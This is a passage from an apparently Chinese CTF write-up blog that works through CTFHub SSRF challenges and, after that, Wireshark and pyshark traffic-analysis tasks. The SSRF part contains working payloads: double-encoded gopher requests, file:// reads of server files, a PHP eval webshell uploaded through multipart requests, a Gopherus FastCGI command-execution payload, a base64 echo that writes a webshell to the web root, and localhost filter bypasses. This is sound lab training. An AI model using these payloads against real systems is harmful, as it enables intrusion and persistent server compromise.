class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在向服务器发送请求时，首先浏览器会进行一次 URL解码，其次服务器收到请求后，在执行curl功能时，进行第二次 URL解码。所以我们需要两次编码</p><ul><li><p><strong>构造gopher协议</strong></p><ul><li>在gopher协议中发送HTTP的数据，需要以下三步：</li></ul><p>1、构造HTTP数据包</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.构造HTTP数据包</span></span><br><span class="line">raw = <span class="string">"""POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:80</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">key=21327983b7a37abf3ace93cc0e64f15f"""</span></span><br></pre></td></tr></table></figure><p>2、URL编码、替换回车换行为%0d%0a</p>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URL编码、替换回车换行为%0d%0a</span></span><br><span class="line">data = raw.replace(<span class="string">'\n'</span>,<span class="string">'\r\n'</span>)</span><br><span class="line">res = urllib.parse.quote(urllib.parse.quote(data))</span><br></pre></td></tr></table></figure><p>3、发送gopher协议，有的教程说后面要加结束符<code>%0d%0a</code>，但是这道题貌似不用</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey%253D21327983b7a37abf3ace93cc0e64f15f</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: challenge-f2d0d9c7e78f56ec.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>结果</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span>: Mon, 10 Apr 2023 07:44:48 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 206</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: *</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span>: X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span>: *</span><br><span class="line">  </span><br><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Mon, 10 Apr 2023 07:44:43 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.25 (Debian)</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/5.6.40</span><br><span class="line"><span class="attribute">Content-Length</span>: 32</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line">  </span><br><span class="line"><span class="attribute">ctfhub&#123;dbcc1a3f4c6fb16d610f70aa&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h4><span id="上传文件">上传文件</span></h4><ol><li>查看源代码</li></ol><p>发送</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/index.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: challenge-eff97dea17259597.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>返回</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_REQUEST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: /?url=_"</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[<span class="string">'url'</span>]);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure><p>发送</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/flag.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: challenge-eff97dea17259597.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>返回</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] != <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Just View From 127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">"file"</span>]) &amp;&amp; $_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> getenv(<span class="string">"CTFHUB"</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Upload Webshell</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"/flag.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>得知是要构造一个表单提交。</p><ol start="2"><li><p>使用http协议，访问flag.php</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-eff97dea17259597.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure></li></ol><p>发现并没有提交的button，我们需要自己写一个</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后bp抓包</p>  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 330</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Origin</span>: http://challenge-eff97dea17259597.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryqNWrH2XOYKqFjQzw</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://challenge-eff97dea17259597.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryqNWrH2XOYKqFjQzw</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="shell.pphphp"</span><br><span class="line"><span class="attribute">Content-Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST['shell']); ?&gt;</span><br><span class="line">------WebKitFormBoundaryqNWrH2XOYKqFjQzw</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">æäº¤</span><br><span class="line">------WebKitFormBoundaryqNWrH2XOYKqFjQzw--</span><br></pre></td></tr></table></figure><p>  编码两次结果</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gohper://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520330%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A//challenge-eff97dea17259597.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryqNWrH2XOYKqFjQzw%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Macintosh%253B%2520Intel%2520Mac%2520OS%2520X%252010_15_7%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/103.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A//challenge-eff97dea17259597.sandbox.ctfhub.com%253A10800/%253Furl%253Dhttp%253A//127.0.0.1/flag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryqNWrH2XOYKqFjQzw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522shell.pphphp%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2527shell%2527%255D%2529%253B%2520%253F%253E%250D%250A------WebKitFormBoundaryqNWrH2XOYKqFjQzw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%250D%250A------WebKitFormBoundaryqNWrH2XOYKqFjQzw--</span></span><br></pre></td></tr></table></figure><p>访问index.php抓包，构造payload</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">不知道为啥过不了，和网上流程都一样，不管</span><br><span class="line"></span><br><span class="line">#### fastcgi</span><br><span class="line"></span><br><span class="line">- 这里要用到**gopherus**类进行payload生成</span><br><span class="line"></span><br><span class="line">  ```cmd</span><br><span class="line">  python2 gopherus --exploit fastcgi</span><br><span class="line">  /var/www/html/index.php</span><br><span class="line">  ls</span><br><span class="line">  # 获得</span><br><span class="line">  gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27ls%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure><p>  然后再进行一次url编码<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A&#x2F;&#x2F;127.0.0.1%3A9000&#x2F;_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520&#x2F;%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP&#x2F;1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A&#x2F;&#x2F;input%250F%2517SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%250D%2501DOCUMENT_ROOT&#x2F;%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527ls%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span><br></pre></td></tr></table></figure></p><ul><li><p>使用bp的repeater发送后获取</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NX-Powered-By: PHP/5.6.40</span><br><span class="line"><span class="attribute">Content-type</span>: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line"><span class="attribute">index.php</span></span><br><span class="line"><span class="attribute">-----Made-by-SpyD3r-----</span></span><br><span class="line"><span class="attribute">htm</span></span><br></pre></td></tr></table></figure></li><li><p>然后重复上述操作，输入并进行url编码即可获取flag</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /</span><br><span class="line">ls /flag</span><br></pre></td></tr></table></figure></li><li><p>也可以写个一句话木马上去</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> JTNDJTNGcGhwJTIwZXZhbCUyOCUyNF9QT1NUJTVCc2hlbGwlNUQlMjklM0IlM0YlM0UlMDA= | base64 -d &gt; /var/www/html/shel1.php</span><br></pre></td></tr></table></figure></li></ul><p>其中<em>/var/www/html/index.php*可以用</em>/usr/local/lib/php/PEAR.php*代替，就是服务器里面有的php文件即可，pear是自带的。</p><p><a href="https://www.modb.pro/db/163739" target="_blank" rel="noopener">原理参考</a></p><h4><span id="redis协议">Redis协议</span></h4><ul><li><p>通过gopherus一把梭</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis</span><br><span class="line">PHPShell</span><br><span class="line">&lt;?php eval($_POST[shell]);?&gt;</span><br></pre></td></tr></table></figure></li><li><p>再进行一次url编码即可</p></li></ul><h4><span id="url-bypass">URL Bypass</span></h4><p>这个题的考点与DNS解析有关，像我们平时输入的百度网址<a href="http://www.baidu.com中的www是什么意思？我们简单了解一下域名解析前缀的作用">www.baidu.com中的www是什么意思？我们简单了解一下域名解析前缀的作用</a></p><p>www：二级域名解析，以百度为例，就是<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p><p>@ ：主域名解析，即@符号后面直接跟域名，如果前面有东西，会被忽略。</p><p>*：是指泛解析，是指除已添加的解析记录以外的所有主机都以此为准，以百度为例，就是 12343.baidu.com。</p><ul><li><p>这道题直接使用@跳过</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://notfound.ctfhub.com@127.0.0.1:80/flag.php</span></span><br></pre></td></tr></table></figure></li></ul><p><a href="https://blog.csdn.net/xhy18634297976/article/details/120895812" target="_blank" rel="noopener">其他方法</a></p><h4><span id="数字ip-bypass">数字IP Bypass</span></h4><p><a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/" target="_blank" rel="noopener">IP地址转换</a></p><ul><li><p>方法一：通过IP地址转换，将10进制的数代替127.0.0.1即可，或者16进制前面加个0x</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-8c88f2c702488010.sandbox.ctfhub.com:10800/?url=2130706433:80/flag.php</span><br><span class="line"></span><br><span class="line">http://challenge-b558d4473913b437.sandbox.ctfhub.com:10800/?url=0x7F000001:80/flag.php</span><br></pre></td></tr></table></figure></li><li><p>方法二：使用localhost</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-8c88f2c702488010.sandbox.ctfhub.com:10800/?url=localhost:80/flag.php</span><br></pre></td></tr></table></figure></li><li><p>方法三；特殊地址<a href="http://0/" target="_blank" rel="noopener">http://0/</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-8c88f2c702488010.sandbox.ctfhub.com:10800/?url=0/flag.php</span><br></pre></td></tr></table></figure></li></ul><h4><span id="302跳转">302跳转</span></h4><ul><li>常规解法参考上题能做。</li><li>使用<a href="https://www.bejson.com/convert/shorturl/" target="_blank" rel="noopener">短地址转换</a> <code>http://127.0.0.1/flag.php</code>即可</li></ul><h4><span id="dns重绑定-bypass">DNS重绑定 Bypass</span></h4><ul><li><p><strong>同源策略</strong>：两个URL使用相同的<font color="red"><strong><em>协议、域名、端口</em></strong> </font>（IE浏览器没有端口）三者相同则称为同源。简单来说同源就是为了使一个域名下的网站只能调用本域名下的资源，防止其它域名的访问造成一些危害。</p></li><li><p>DNS重绑定：在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。（浏览器同源策略） 这就是DNS Rebinding攻击。</p></li><li><p><a href="https://zhuanlan.zhihu.com/p/89426041" target="_blank" rel="noopener">参考</a></p></li><li><p><a href="https://lock.cmpxchg8b.com/rebinder.html" target="_blank" rel="noopener">重绑定工具地址</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-008000c7973432be.sandbox.ctfhub.com:10800/?url=7f000001.c0a80001.rbndr.us/flag.php</span><br></pre></td></tr></table></figure></li></ul><h1><span id="reverse">Reverse</span></h1><h1><span id="crypto">Crypto</span></h1><h1><span id="misc">Misc</span></h1><h3><span id="流量分析">流量分析</span></h3><ul><li>使用到工具是<strong>WireShark</strong></li></ul><h4><span id="mysql流量">Mysql流量</span></h4><ul><li>直接下载包，然后在filter里面输入mysql，然后看info里面登录成功的那条</li><li>使用<strong>follow tcp stream</strong> 然后在<strong>find</strong>里面输入关键字<code>ctf</code>即可。</li></ul><h4><span id="redis流量">Redis流量</span></h4><ul><li><p>使用<strong>follow tcp stream</strong> 然后在<strong>find</strong>里面输入关键字<code>ctf</code>即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Fl4g1</span><br><span class="line">$22</span><br><span class="line">ctfhub&#123;6051d6123de43df</span><br><span class="line">+OK</span><br><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$5</span><br><span class="line">flag2</span><br><span class="line">$18</span><br><span class="line">ad7609804925c0121&#125;</span><br></pre></td></tr></table></figure><p>拼接出<code>ctfhub{6051d6123de43dfad7609804925c0121}</code></p></li></ul><h4><span id="mongodb">MongoDB</span></h4><ul><li>也是直接跟踪流，然后旁边有个选项可以直接选择第几个流，我们直接搜关键词<code>ctfhub{</code>找不到就换下个流，节省很多时间。</li></ul><h4><span id="icmp-data">ICMP Data</span></h4><ul><li><p>方法一：无法跟踪流，用↓逐个观察，发现有个位置每次和上次不一样，拼起来就是flag，每次都有两个包是一样的一个<em>request</em>一个<em>response</em>，因此答案就是<code>ctfhub{c87eb99796406ac0b}</code></p></li><li><p>方法二：编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="comment"># --author：valecalida--</span></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system <span class="keyword">as</span> get_hex</span><br><span class="line"><span class="comment"># 调用tshark时需要将tshark加入环境变量，且脚本需要与流量包在一个路径下</span></span><br><span class="line"> </span><br><span class="line">get_hex(<span class="string">"tshark -r icmp_data.pcap -Y \"icmp &amp;&amp; icmp.type==8\" -T fields -e data &gt; flag.txt"</span>)</span><br><span class="line">f = open(<span class="string">'flag.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    flag += chr(int(line[<span class="number">16</span>:<span class="number">18</span>], <span class="number">16</span>))</span><br><span class="line">print(flag)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><ul><li>使用pyshark，其中<strong>type=8即请求，type=0即响应</strong>，这里0或者8都可以，因为是重复的。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="comment"># --author: valecalida--</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"> </span><br><span class="line">cap = pyshark.FileCapture(<span class="string">"icmp_data.pcap"</span>, display_filter=<span class="string">"icmp &amp;&amp; icmp.type==8"</span>)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">25</span>):</span><br><span class="line">    flag += chr(int(str(cap[i].icmp.data_data)[<span class="number">24</span>:<span class="number">26</span>], <span class="number">16</span>))</span><br><span class="line">print(flag)</span><br><span class="line">cap.close()</span><br></pre></td></tr></table></figure></li></ul><p><strong>注意</strong>：在jupyter里面使用代码会导致报错<code>This event loop is already running</code>。</p><p><em>解决方案：</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> nest_asyncio</span><br><span class="line">nest_asyncio.apply()</span><br></pre></td></tr></table></figure><h4><span id="icmp-length">ICMP 